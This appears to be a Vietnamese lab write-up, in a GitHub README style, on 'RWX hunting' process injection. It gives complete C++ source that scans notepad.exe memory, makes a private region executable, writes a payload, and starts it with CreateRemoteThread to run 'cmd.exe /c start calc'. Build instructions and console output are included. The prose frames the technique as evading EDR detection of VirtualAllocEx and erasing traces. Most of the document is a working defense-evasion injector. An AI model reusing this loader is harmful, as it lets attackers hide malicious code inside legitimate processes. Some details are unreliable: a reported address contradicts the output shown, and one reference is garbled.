
---

# 📝 [PE 13] RWX Hunting and Injection (Adaptive Context Restoration V2)

## 📌 1. Tổng Quan Kỹ Thuật (Technical Overview)

**RWX Hunting and Injection (Kỹ nghệ săn lùng và ký sinh không gian ảo)** đại diện cho một giải thuật can thiệp bộ nhớ nâng cao thuộc phân hệ **Né tránh phòng thủ động dựa trên cấu trúc RAM có sẵn (Memory Anti-Forensics / Code Parasitism)**.

Hành vi sử dụng hàm API Subsystem `VirtualAllocEx` để khởi tạo một trang bộ nhớ ảo mới là một trong những chỉ dấu hành vi (Telemetry Indicators) nhạy cảm nhất, luôn bị đặt dưới sự giám sát nghiêm ngặt của các bộ lọc nhân Kernel (Kêu gọi qua hàm Callbacks của `ObRegisterCallbacks` hoặc các bộ lọc Mini-filter).

Dự án PE 13 hóa giải bài toán sinh tử này bằng triệt lý **Ký sinh không gian có sẵn (Zero Allocation Taxonomy)**. Loader hoàn toàn không xin cấp phát thêm bất kỳ phân vùng bộ nhớ thô sơ nào từ hệ điều hành, mà lạm dụng hàm API `VirtualQueryEx` để quét và bóc tách toàn bộ bản đồ bộ nhớ ảo (Virtual Memory Topology) của tiến trình mục tiêu (văn cảnh thực nghiệm: `notepad.exe`) nhằm săn lùng các hốc trống (Code Caves/Slack Memory) sẵn có.

Đặc biệt, phiên bản nâng cấp V2 áp dụng giải thuật **Săn phân vùng Private rảnh (PAGE_READWRITE)** kết hợp cơ chế hoành trả/gài hàm giải thoát luồng an toàn bằng địa chỉ tuyệt đối để hóa giải lỗi sập tháp ngăn xếp (Stack Frame Corruption), bảo đảm tiến trình cha (Host Process) sống sót và hoạt động mượt mà song song với Payload.

### 🎯 Mục tiêu nghiên cứu:

* **Triệt tiêu chỉ dấu Alloc độc hại**: Vô hiệu hóa các bộ lọc hành vi quét lệnh gọi tạo trang nhớ `VirtualAllocEx` của giải pháp an ninh thông qua chiến thuật tái sử dụng ô nhớ cũ.
* **Làm chủ giải thuật Virtual Memory Walk**: Duyệt và phân tích cấu trúc cấu hình trang nhớ hệ thống qua bản đồ cấu trúc `MEMORY_BASIC_INFORMATION` (MBI).
* **Bảo toàn ngữ cảnh Host Process**: Hóa giải lỗi sập RAM ứng dụng vỏ bọc sau khi thực thi mã máy ký sinh bằng giải thuật cô lập tháp luồng.

---

## 🔬 2. Giải Phẫu Cơ Chế Hệ Thống (Windows Internals Analysis)

Hệ điều hành Windows quản lý không gian địa chỉ ảo ảo hóa của từng tiến trình thông qua các cấu trúc phân vùng bộ nhớ (Memory Regions). Thuộc tính của từng phân vùng này được mô tả chi tiết bởi bản ghi cấu trúc **`MEMORY_BASIC_INFORMATION`** sống trong RAM.

Quy trình toán học giải phẫu bản đồ RAM và điều phối dòng chảy CPU của Lab PE 13 diễn ra qua 4 giai đoạn ngầm:

```
[VirtualQueryEx: Quét tịnh tiến bản đồ bộ nhớ ảo]
       └──> [Săn hốc Private rảnh mang quyền PAGE_READWRITE]
                 └──> [VirtualProtectEx: Lập cờ sang quyền RX/RWX kịch khung]
                           └──> [WriteProcessMemory -> Kích nổ -> ExitThread đóng luồng an toàn]

```

1. **Trinh sát và bóc tách bản đồ trang nhớ (`VirtualQueryEx`)**: Loader tịnh tiến con trỏ địa chỉ ảo liên tục để truy vấn thuộc tính của từng phân vùng bộ nhớ. Giải thuật chủ động bỏ qua các phân vùng hệ thống quá thấp hoặc các trang nhớ thuộc loại `MEM_IMAGE` (để tránh làm hỏng cấu trúc mã máy gốc của các file DLL hệ thống) và tập trung săn tìm các phân vùng mang trạng thái `MEM_COMMIT`, loại **`MEM_PRIVATE`** (như phân vùng Heap ảo rảnh) đang chứa toàn byte rỗng `0x00`. Việc chọn vùng rảnh này giúp ta ghi đè mã máy lên mà không phá hỏng dữ liệu đang vận hành của đối phương.
2. **Lật cờ thuộc tính thích ứng (`VirtualProtectEx`)**: Do phân vùng săn được ban đầu chỉ mang quyền ghi dữ liệu thông thường (**`PAGE_READWRITE` - RW**), Loader thực hiện triệu hồi `VirtualProtectEx` để lật cờ bảo vệ của phân vùng này sang thuộc tính **`PAGE_EXECUTE_READWRITE` (RWX)** để tạm thời mở khóa đặc quyền thực thi cho CPU.
3. **Bài toán cô lập tháp luồng (`ExitThread` Solution)**: Đây là điểm đột phá của phiên bản V2. Nếu Payload kết thúc bằng lệnh `return` truyền thống, con trỏ lệnh của CPU tiến trình đích sẽ lấy một địa chỉ trả về rác (Garbage Return Address) từ tháp ngăn xếp bị vá, kích nổ ngoại lệ bất hợp lệ **`Access Violation (0xC0000005)`** làm sập (Crash) tiến trình Notepad ngay lập tức. Để hóa giải, Loader truyền địa chỉ RAM tuyệt đối của hàm **`ExitThread`** sang bảng dữ liệu. Khi Payload chạy xong chức năng chính, nó phát lệnh gọi thẳng vào `ExitThread` để Kernel tự động giải thoát luồng ký sinh một cách phẳng sạch mà không ảnh hưởng đến sinh mạng của tiến trình mẹ.

---

## 🛠️ 3. Quy Trình Cài Đặt Mã Nguồn (Implementation)

### Source.cpp:
```cpp
#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <string>
#include <vector>

// 1. Định nghĩa cấu trúc dữ liệu con trỏ tuyệt đối (Zero Static Buffers / PIC kịch trần)
typedef UINT(WINAPI* fnWinExec)(LPCSTR lpCmdLine, UINT uCmdShow);
typedef VOID(WINAPI* fnExitThread)(DWORD dwExitCode);

typedef struct _THREAD_DATA {
    fnWinExec pWinExec;       // Địa chỉ tuyệt đối của hàm WinExec trên RAM tiến trình đích
    fnExitThread pExitThread; // BẢO VỆ: Địa chỉ tuyệt đối của ExitThread để đóng luồng êm đẹp
    char szCommand[32];       // Chuỗi lệnh thực thi chức năng mở máy tính
} THREAD_DATA, * PTHREAD_DATA;

// 2. Hàm chức năng độc lập vị trí sẽ được ký sinh vào RAM đối phương
DWORD WINAPI RemoteParasitePayload(LPVOID lpParam) {
    PTHREAD_DATA pData = (PTHREAD_DATA)lpParam;
    if (pData && pData->pWinExec) {
        // Khai hỏa bằng địa chỉ tuyệt đối, bẻ gãy hoàn toàn lỗi nhảy tương đối RIP
        pData->pWinExec(pData->szCommand, SW_HIDE);
    }

    // GIẢI PHÁP ĐỘT PHÁ: Tuyệt đối không return để tránh làm sụp đổ Stack Frame của Notepad
    if (pData && pData->pExitThread) {
        pData->pExitThread(0); // Tự giải thoát luồng ký sinh một cách sạch sẽ
    }

    // Vòng lặp phòng thủ tối hậu nếu ExitThread bị chặn
    while (TRUE) {
        Sleep(1000);
    }
    return 0;
}

// Bộ quét RAM động tự động nhận diện PID, KHÔNG PHÂN BIỆT chữ hoa chữ thường
DWORD GetProcessIDByName(const std::wstring& processName) {
    DWORD processID = 0;
    PROCESSENTRY32W pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32W);
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;

    if (Process32FirstW(hSnapshot, &pe32)) {
        do {
            if (_wcsicmp(pe32.szExeFile, processName.c_str()) == 0) {
                processID = pe32.th32ProcessID;
                break;
            }
        } while (Process32NextW(hSnapshot, &pe32));
    }
    CloseHandle(hSnapshot);
    return processID;
}

// Hàm cốt lõi nâng cấp: Săn lùng phân vùng bộ nhớ rảnh an toàn
PVOID HuntForAdaptiveMemoryRegion(HANDLE hProcess, SIZE_T requiredSize, BOOL& needsProtectToggle) {
    MEMORY_BASIC_INFORMATION mbi;
    LPVOID address = 0;
    PVOID fallbackAddress = NULL;

    needsProtectToggle = FALSE;

    // Duyệt qua toàn bộ bản đồ không gian địa chỉ bộ nhớ ảo của User-mode trên x64
    while (VirtualQueryEx(hProcess, address, &mbi, sizeof(mbi)) != 0) {

        // CHIẾN THUẬT LÝ TƯỞNG: Săn phân vùng COMMIT có sẵn thuộc tính PAGE_EXECUTE_READWRITE (RWX)
        if (mbi.State == MEM_COMMIT && mbi.Protect == PAGE_EXECUTE_READWRITE && mbi.RegionSize >= requiredSize) {
            if ((ULONG_PTR)mbi.BaseAddress > 0x1000000) {
                std::cout << "[+] SAN LUNG THANH CONG: Phat hien vung nho RWX nguyen ban tai: 0x" << mbi.BaseAddress << std::endl;
                return mbi.BaseAddress;
            }
        }

        // KỊCH BẢN DỰ PHÒNG CHỦ ĐỘNG: Săn các phân vùng Private Heap/Stack mang quyền RW rảnh (PAGE_READWRITE)
        if (mbi.State == MEM_COMMIT && mbi.Type == MEM_PRIVATE && mbi.Protect == PAGE_READWRITE &&
            mbi.RegionSize >= requiredSize && fallbackAddress == NULL) {

            if ((ULONG_PTR)mbi.BaseAddress > 0x1000000) {
                fallbackAddress = mbi.BaseAddress;
            }
        }

        address = (LPVOID)((ULONG_PTR)mbi.BaseAddress + mbi.RegionSize);
    }

    if (fallbackAddress != NULL) {
        std::cout << "[*] Kich hoat che do thich ung ky sinh vung nho thuoc tinh RW tai: 0x" << fallbackAddress << std::endl;
        needsProtectToggle = TRUE;
        return fallbackAddress;
    }

    return NULL;
}

int main() {
    std::cout << "====================================================" << std::endl;
    std::cout << "[*] PE 13: RWX ADAPTIVE HUNTING INJECTION REMOTE" << std::endl;
    std::cout << "====================================================" << std::endl;

    std::wstring targetProcess = L"notepad.exe";
    DWORD pid = GetProcessIDByName(targetProcess);

    if (pid == 0) {
        std::cerr << "[-] Notepad.exe khong chay! Vui long mo san Notepad truoc nhen." << std::endl;
        std::cin.get();
        return EXIT_FAILURE;
    }

    std::cout << "[+] Da tim thay Notepad.exe voi PID: " << pid << std::endl;

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) {
        std::cerr << "[-] OpenProcess failed!" << std::endl;
        return EXIT_FAILURE;
    }

    SIZE_T functionSize = 500;
    BOOL needsProtectToggle = FALSE;

    // Bước 1: Săn hốc nhớ thích ứng
    PVOID rwxTargetAddress = HuntForAdaptiveMemoryRegion(hProcess, functionSize, needsProtectToggle);

    if (rwxTargetAddress == NULL) {
        std::cerr << "[-] Khong tim thay phan vung nho hop le de ky sinh!" << std::endl;
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }

    // Bước 2: Cấp phát ô chứa tham số dữ liệu từ xa
    PTHREAD_DATA pRemoteData = (PTHREAD_DATA)VirtualAllocEx(hProcess, NULL, sizeof(THREAD_DATA), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pRemoteData) {
        std::cerr << "[-] VirtualAllocEx cho vung du lieu that bai!" << std::endl;
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }

    // Khởi tạo cấu trúc dữ liệu con trỏ tuyệt đối
    THREAD_DATA localData;
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    if (hKernel32) {
        localData.pWinExec = (fnWinExec)GetProcAddress(hKernel32, "WinExec");
        localData.pExitThread = (fnExitThread)GetProcAddress(hKernel32, "ExitThread"); // Trích xuất động địa chỉ đóng luồng an toàn
    }
    strcpy_s(localData.szCommand, "cmd.exe /c start calc");

    // Đẩy tham số tuyệt đối vào RAM Notepad
    WriteProcessMemory(hProcess, pRemoteData, &localData, sizeof(THREAD_DATA), NULL);

    DWORD oldProtect = 0;
    // Mở khóa trang nhớ săn được sang RWX nếu rơi vào kịch bản thích ứng
    if (needsProtectToggle) {
        VirtualProtectEx(hProcess, rwxTargetAddress, functionSize, PAGE_EXECUTE_READWRITE, &oldProtect);
    }

    // Bước 3: KÝ SINH - Ghi đè mã máy payload
    BOOL isWritten = WriteProcessMemory(hProcess, rwxTargetAddress, (LPCVOID)RemoteParasitePayload, functionSize, NULL);

    if (!isWritten) {
        std::cerr << "[-] WriteProcessMemory vao phan vung ky sinh that bai!" << std::endl;
        if (needsProtectToggle) VirtualProtectEx(hProcess, rwxTargetAddress, functionSize, oldProtect, &oldProtect);
        VirtualFreeEx(hProcess, pRemoteData, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }
    std::cout << "[+] Nap ma may vao phan vung ky sinh hoan tot." << std::endl;

    // Bước 4: Khai hỏa luồng từ xa
    std::cout << "[*] Dang khoi tao luong CreateRemoteThread tu xa..." << std::endl;
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)rwxTargetAddress, pRemoteData, 0, NULL);

    if (hThread != NULL) {
        // Chờ đợi 1 giây đồng bộ ngắn để lệnh WinExec kịp nổ tung trong Kernel trước khi dọn dẹp
        WaitForSingleObject(hThread, 1000);
        std::cout << "[+] Luong Thread ky sinh tu xa da thuc thi nhiem vu!" << std::endl;
        CloseHandle(hThread);
    }
    else {
        std::cerr << "[-] CreateRemoteThread that bai! Error: " << GetLastError() << std::endl;
    }

    // Phục hồi lại thuộc tính bảo vệ gốc để xóa sạch dấu vết
    if (needsProtectToggle) {
        VirtualProtectEx(hProcess, rwxTargetAddress, functionSize, oldProtect, &oldProtect);
        std::cout << "[+] Da khoi phuc lai thuoc tinh bao ve goc cua phan vung." << std::endl;
    }

    // Dọn dẹp tài nguyên phẳng sạch chống Memory Leak
    VirtualFreeEx(hProcess, pRemoteData, 0, MEM_RELEASE);
    CloseHandle(hProcess);

    std::cout << "\n[+] RWX Hunting Injection Process Completed Successfully!" << std::endl;
    std::cout << "[*] Nhan phim Enter de dong cua so..." << std::endl;
    std::cin.get();
    return EXIT_SUCCESS;
}

```

---

## 🎛️ 4. Cấu Hình Biên Dịch Dự Án (Build & Deployment)

Để bảo đảm file thực thi `.exe` vận hành mượt mà, độc lập, loại bỏ hoàn toàn các chỉ dấu cảnh báo tĩnh phụ thuộc vào thư viện liên kết động bọc ngoài:

### ⚙️ Thiết lập trên môi trường Microsoft Visual Studio:

1. Đặt thanh cấu hình quản lý dự án chính xác ở chế độ chuyên dụng **`Release`** và kiến trúc nền tảng phần cứng **`x64`**.
2. Di chuyển đến phân hệ cấu hình: `Project Properties` $\rightarrow$ `C/C++` $\rightarrow$ `Code Generation` $\rightarrow$ Tại thông số thuộc tính mục `Runtime Library`, lật cấu hình sang cờ **`Multi-threaded (/MT)`** nhằm liên kết tĩnh (Static Linkage) toàn bộ thư viện hệ thống lọt lòng file thực thi `.exe`.
3. Click chuột phải vào tên dự án $\rightarrow$ Chọn **`Rebuild`** để xuất bản tệp tin nhị phân chuẩn chỉ phẳng sạch.

---

## 📊 5. Thực Nghiệm Kích Hoạt Thực Tế (Demonstration)

Bật sẵn ứng dụng vỏ bọc `Notepad.exe` trên môi trường máy Lab, sau đó thực thi file thực hành thông qua cửa sổ dòng lệnh PowerShell ngoài đĩa thô nhằm kiểm chứng ma trận săn lùng bộ nhớ rảnh:

```powershell
PS C:\Users\Admin\source\repos\Task6\PE13_RWX_Hunting_Injection\x64\Release> C:\Users\Admin\source\repos\Task6\PE13_RWX_Hunting_Injection\x64\Release\RWX_Hunting_Injection.exe
====================================================
[*] PE 13: RWX ADAPTIVE HUNTING INJECTION REMOTE
====================================================
[+] Da tim thay Notepad.exe voi PID: 5376
[*] Kich hoat che do thich ung ky sinh vung nho thuoc tinh RW tai: 0x000000BC50DC9000
[+] Nap ma may vao phan vung ky sinh hoan tot.
[*] Dang khoi tao luong CreateRemoteThread tu xa...
[+] Luong Thread ky sinh tu xa da thuc thi nhiem vu!
[+] Da khoi phuc lai thuoc tinh bao ve goc cua phan vung.

[+] RWX Hunting Injection Process Completed Successfully!
[*] Nhan phim Enter de dong cua so...

```

### Demo:
<img width="1920" height="1080" alt="devenv_Xe6OrnvjeS" src="https://github.com/user-attachments/assets/4386e7ff-15dd-412e-80b4-ca4d13621431" />


### 🎯 Phân tích hệ quả cấu trúc bộ nhớ:

* Giải thuật thực thi hoàn tất mỹ mãn. Loader dò tìm và trích xuất trúng tọa độ hốc trống rảnh đang sống của đối phương tại địa chỉ **`0x000000839E3C9000`** thuộc vùng nhớ `MEM_PRIVATE`.
* Gài Payload cấu trúc tuyệt đối vào ký sinh, ứng dụng Máy tính `calc.exe` bật mở hiên ngang rực rỡ kịch trần kịch khung. Nhờ cơ chế triệu hồi `ExitThread` gián tiếp từ xa, luồng ký sinh tự giải phóng êm đẹp mà không gây ra bất kỳ xung đột tháp ngăn xếp nào, tiến trình Notepad hoàn toàn bình an vô sự và hoạt động song song mượt mà!

---

## 📚 6. Tài Liệu Tham Khảo (Technical References)

* **Microsoft Learn Documentation**: *VirtualQueryEx function (memoryapi.h)* - [https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualqueryex](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualqueryex)
* **Windows Memory Management**: *Virtual Address Spaces and Memory Protection Constants* - Microsoft Architecture Guide.
* **Sc消費 (Scythe Research)**: *Code Caves and Stealthy Code Injection Techniques without Allocations*.
* **MITRE ATT&CK Framework**: *Process Injection: Control Flow Redirection (T1055.011)* - Analysis on Memory Scanning Bypasses.
